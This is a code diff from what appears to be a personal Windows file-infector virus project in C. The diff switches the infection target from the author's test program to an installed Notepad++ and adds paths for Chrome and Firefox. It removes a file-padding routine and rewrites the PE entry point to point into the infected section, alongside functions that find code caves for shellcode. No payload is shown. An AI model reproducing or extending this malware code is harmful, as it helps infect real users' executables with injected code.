@@ -19,8 +19,11 @@
 // path to my own program that pops up message box.
 #define MSGBOX_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\msgBox.exe"
 #define MSGBOX_CPY_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\copies\\msgBox.exe"
+#define CHROME_PATH "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+#define NOTEPAD_PLUS_PLUS_PATH "C:\\Program Files (x86)\\Notepad++\\notepad++.exe"
+#define FIREFOX_PATH "C:\\Program Files\\Mozilla Firefox\\firefox.exe"
 
-#define INFECTED_PATH MSGBOX_PATH
+#define INFECTED_PATH NOTEPAD_PLUS_PLUS_PATH
 
 PVOID get_code_cave_address_in_section(EXE_file* infected, PIMAGE_SECTION_HEADER section, PDWORD result_out, DWORD shellcode_size)
 {
@@ -71,56 +74,6 @@ PVOID get_code_cave_address(EXE_file* infected, PDWORD result_out, DWORD shellco
     return address;
 }
 
-DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_out)
-{
-    // Return the origianl file size.
-    size_of_appned = align(size_of_appned, USUALLY_FILE_ALIGN, 0);
-    PVOID zero_buffer = calloc(size_of_appned, 1);
-    int result = 0;
-    HANDLE file_handle = CreateFileA(file_name, // open Two.txt
-        FILE_APPEND_DATA,         // open for writing
-        FILE_SHARE_READ,          // allow multiple readers
-        NULL,                     // no security
-        OPEN_EXISTING,              // open or create
-        FILE_ATTRIBUTE_NORMAL,    // normal file
-        NULL);                   // no attr. template
-
-    if (file_handle == INVALID_HANDLE_VALUE)
-    {
-        *result_out = ERROR;
-        return 0;
-    }
-
-    DWORD original_code_size = GetFileSize(file_handle, NULL);
-    printf("old file size is %d\n",original_code_size);
-
-    if (file_handle == INVALID_HANDLE_VALUE)
-    {
-        printf("Could not open Two.txt.");
-        *result_out = ERROR;
-        return 0;
-    }
-
-    printf("add empty place to %s\n", file_name);
-    result = WriteFile(file_handle, zero_buffer, size_of_appned, NULL, NULL);
-    if (result == 0)
-    {
-        printf("error appending zeros to end of file");
-        *result_out = ERROR;
-        return 0;
-    }
-    printf("new file size is %d\n", GetFileSize(file_handle, NULL));
-
-    CloseHandle(file_handle);
-    if (zero_buffer != NULL)
-    {
-        free(zero_buffer);
-    }
-    else *result_out = ERROR;
-
-    *result_out = SUCCESS;
-    return original_code_size;
-}
 
 VOID set_new_entery_point(EXE_file* infected, DWORD new_entery_point)
 {
@@ -128,7 +81,8 @@ VOID set_new_entery_point(EXE_file* infected, DWORD new_entery_point)
     new_entery_point = (DWORD)new_entery_point - (DWORD)infected->mapped_handle;
     // change address to RVA.
     new_entery_point += infected->infected_section->VirtualAddress - infected->infected_section->PointerToRawData;
-    infected->headers->OptionalHeader.AddressOfEntryPoint = new_entery_point;
+    infected->headers->OptionalHeader.AddressOfEntryPoint = infected->infected_section->VirtualAddress;
+    //infected->headers->OptionalHeader.AddressOfEntryPoint = new_entery_point;
 }
 
 int main()
